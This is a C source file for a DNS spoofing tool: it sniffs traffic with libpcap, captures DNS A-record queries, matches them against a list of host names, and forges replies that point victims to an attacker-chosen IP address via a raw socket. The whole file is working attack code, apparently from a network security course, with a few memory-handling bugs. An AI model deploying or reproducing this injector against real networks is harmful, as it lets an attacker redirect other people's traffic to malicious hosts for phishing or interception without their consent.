#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <time.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <string.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <stdbool.h>

#include "def.h"

#define ethhdr_size  14
#define udphdr_size  8
#define iphdr_size 20
#define dnshdr_size 12
#define quehdr_size 4
#define rrhdr_size 16

typedef struct DNS_HEADER DNS_HEADER;
typedef struct RES_RECORD RES_RECORD;
typedef struct QUESTION QUESTION;

extern char *host_names[];
extern char *host_ip[];
extern int total_pairs;
extern char *ip_spoof;

struct sockaddr_in source, dest, sp_source, sp_dest;

void parse_dns_packet(const u_char *packet_buffer, int packet_size) {
	int i, p, j, k;
	in_addr_t tmp_addr;
	bool host_found = false;
	unsigned short length;
	char *url, *spoofed_ip = NULL;
    	struct iphdr *ip_header = (struct iphdr *)(packet_buffer +  ethhdr_size);
    	length = ip_header->ihl*4;
    	struct udphdr *udp_header = (struct udphdr*)(packet_buffer + length  + ethhdr_size);
	int size =  ethhdr_size + length + udphdr_size;
	u_char *spoofed_packet;

	/* Parse DNS packet */
	DNS_HEADER *dns_header = (DNS_HEADER *)(packet_buffer + size);

	if (ntohs(udp_header->dest) == 53) {
		int name_len = (int)strlen((const char*)(packet_buffer+size+dnshdr_size));
		/* Get type of DNS and decide whether to process further or not */
		QUESTION *question = (QUESTION *)(packet_buffer + size + dnshdr_size + name_len + 1);
		if(ntohs(question->qtype) != 1) {
			return;
		}
		url = (char *) malloc(name_len);
		for(i = 0; i < name_len; i++) {
	        	p=(packet_buffer+size+dnshdr_size)[i];
	        	for(j=0; j<p; j++) {
	            		url[i]=(packet_buffer+size+dnshdr_size)[i+1];
	            		i=i+1;
	        	}
	        	url[i]='.';
	    	}
	    	url[i-1]='\0';

		/* Get Host Name and compare it with given host names from file */
		if(total_pairs != 0) {
			for(k=0; k < total_pairs; k++) {
				if(strcmp(url, host_names[k]) == 0) {
					host_found = true;
					spoofed_ip = (char *) calloc(strlen(host_ip[k]), 1);
					strcpy(spoofed_ip, host_ip[k]);
				}
			}
			if (host_found == false) {
				return;
			}
		}

		size += dnshdr_size + i + 1;

		/* Create spoof packet here */
		if (spoofed_ip == NULL) {
			spoofed_ip =  (char *) calloc(strlen(ip_spoof), 1);
			strcpy(spoofed_ip, ip_spoof);
		}

		spoofed_packet = (u_char *) calloc(size + quehdr_size + rrhdr_size, 1);

		/* Change required fields before copy packet */
		dns_header->ans_count = htons(1);
		dns_header->flags = htons(33152);

		tmp_addr = ip_header->daddr;
		ip_header->daddr = ip_header->saddr;
		ip_header->saddr = tmp_addr;
		ip_header->tot_len = htons(ntohs(ip_header->tot_len) + rrhdr_size);
		ip_header->frag_off = htons(0);
		ip_header->ttl = 255;

		udp_header->dest  = udp_header->source;
		udp_header->source = htons(53);
		udp_header->len = htons(ntohs(udp_header->len) + rrhdr_size);
		udp_header->check = htons(0);

		/* Copy spoofed packet */
		memcpy(spoofed_packet, packet_buffer, size + rrhdr_size);

		RES_RECORD *res_record = (RES_RECORD *) malloc(rrhdr_size);
		res_record->name = htons(49164);
		res_record->type = htons(1);
		res_record->_class = htons(1);
		res_record->ttl = htonl(6000);
		res_record->data_len = htons(4);
		inet_pton(AF_INET, spoofed_ip, &res_record->rdata);

		memcpy(spoofed_packet + size + quehdr_size, res_record, rrhdr_size);

		/* Send Spoofed packet using ROW socket */
		int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
		int one = 1;
		const int *val = &one;
		if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, 4) < 0) {
			("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
			exit(0);
		}
		int sent;
		sp_dest.sin_family = AF_INET;
		sp_dest.sin_port = udp_header->dest;
		sp_dest.sin_addr.s_addr = ip_header->daddr;
		if ((sent = sendto (s, spoofed_packet + ethhdr_size, ntohs(ip_header->tot_len), 0,
					(struct sockaddr *)&sp_dest, sizeof(sp_dest))) < 0) {
			perror("sendto failed");
        	}
	} else {
		/* Not an UDP packet, so no DNS */
		return;
	}
}

void injection_callback(u_char *temp, const struct pcap_pkthdr* pkthdr,const u_char* packet) {
	struct ethhdr *ethernet_header = (struct ethhdr *)packet;
	struct iphdr *ip_header = (struct iphdr*)(packet + ethhdr_size);
	int size = pkthdr->len;
	switch (ntohs(ethernet_header->h_proto)) {
    	case ETHERTYPE_IP:
		if (ip_header->protocol == 17) {
			parse_dns_packet(packet, size);
		}
		break;						
	default:
		break;		
    	} 
}

void sniff_packets_for_injection(char *interface, char *filterExpression) {

	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* descr;
    	struct bpf_program fp;
    	bpf_u_int32 pMask;
    	bpf_u_int32 pNet;
   	pcap_if_t *alldevs, *d;
    	char dev_buff[64] = {0};
    	int i =0;

	dev = strdup(interface);
	pcap_lookupnet(dev, &pNet, &pMask, errbuf);

    	descr = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
    	if (descr == NULL) {
        	fprintf(stderr, "pcap_open_live() failed due to [%s]\n", errbuf);
        	return;
    	}

    	if (pcap_compile(descr, &fp, filterExpression, 0, pNet) == -1) {
        	fprintf(stderr, "\npcap_compile() failed. Check for filter expression validity.\n");
        	return;
    	}

    	if (pcap_setfilter(descr, &fp) == -1) {
        	fprintf(stderr, "\nUnable to set filter. pcap_setfilter() failed\n");
        	exit(1);
    	}

    	pcap_loop(descr, -1, injection_callback, NULL);

    	return;
}
